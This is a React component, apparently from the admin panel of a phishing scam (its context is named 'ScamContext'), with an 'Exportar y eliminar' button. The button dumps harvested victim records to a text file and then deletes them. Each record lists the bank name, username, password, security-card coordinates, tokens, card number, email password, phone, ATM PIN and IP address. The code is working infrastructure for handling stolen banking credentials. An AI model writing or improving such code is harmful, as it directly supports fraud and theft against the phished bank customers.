import { saveAs } from 'file-saver';
import React, { useContext } from 'react'
import { ScamContext } from '../../context/ScamContext';

export const BtnDownloadTxtAndDelete = () => {

    const {users, setDeleteActive, filteredType, selected} = useContext(ScamContext);
    
// ${e.celular != undefined && (filteredType.includes('Celular') || filteredType.length == 1) ? `= celular: ${e.celular} \n` : ''}
    
    const downloadAndDeleteUsers = async() => {
        if(users.length == 0) return
        
            const blob = new Blob(users.map(e => {
                return `==========
= banco: ${e.name}
= usuario: ${e.username}
= clave: ${e.password}
${e.dos != undefined ? `= dos: ${e.dos}\n` : ''}${e.doce != undefined ? `= doce: ${e.doce}\n` : ''}${e.veinteydos != undefined ? `= veinteydos: ${e.veinteydos}\n` : ''}${e.treintaydos != undefined ? `= treintaydos: ${e.treintaydos}\n` : ''}${e.cuatro != undefined ? `= cuatro: ${e.cuatro}\n` : ''}${e.catorce != undefined ? `= catorce: ${e.catorce}\n` : ''}${e.veinteycuatro != undefined ? `= veinteycuatro: ${e.veinteycuatro}\n` : ''}${e.treintaycuatro != undefined ? `= treintaycuatro: ${e.treintaycuatro}\n` : ''}${e.token1 != undefined && (filteredType.includes('Token1') || filteredType.length ==   1) ? `= token1: ${e.token1}\n` : ''}${e.token2 != undefined && (filteredType.includes('Token2') || filteredType.length == 1) ? `= token2: ${e.token2}\n` : ''}${e.tarjeta != undefined && (filteredType.includes('Tarjeta') || filteredType.length == 1) ? `= tarjeta: ${e.tarjeta}\n` : ''}${e.correo != undefined && (filteredType.includes('Correo') || filteredType.length == 1) ? `= correo: ${e.correo}\n` : ''}${e.claveCorreo != undefined && (filteredType.includes('Clave del correo') || filteredType.length == 1) ? `= clave correo: ${e.claveCorreo}\n` : '' }${e.celular != undefined && (filteredType.includes('Celular') || filteredType.length == 1) ? `= cel: ${e.celular}\n` : '' }${e.atmPassword != undefined && (filteredType.includes('Clave ATM') || filteredType.length == 1) ? `= clave ATM: ${e.atmPassword}\n` : '' }= ip: ${e.ip}
==========

`
}), { type: 'type/plain;charset=utf-8' });
            
            saveAs(blob, `${selected}-${filteredType}-${users.length}.txt`)
    
            return await setDeleteActive(1)
        
    }

    return (
        <div className='flex flex-col'>
            <button 
                onClick={() => downloadAndDeleteUsers()}
                className={'px-3 text-left rounded py-1 hover:bg-blue-400 hover:text-white'}
            >
                Exportar y eliminar
            </button>
        </div>
    )
}
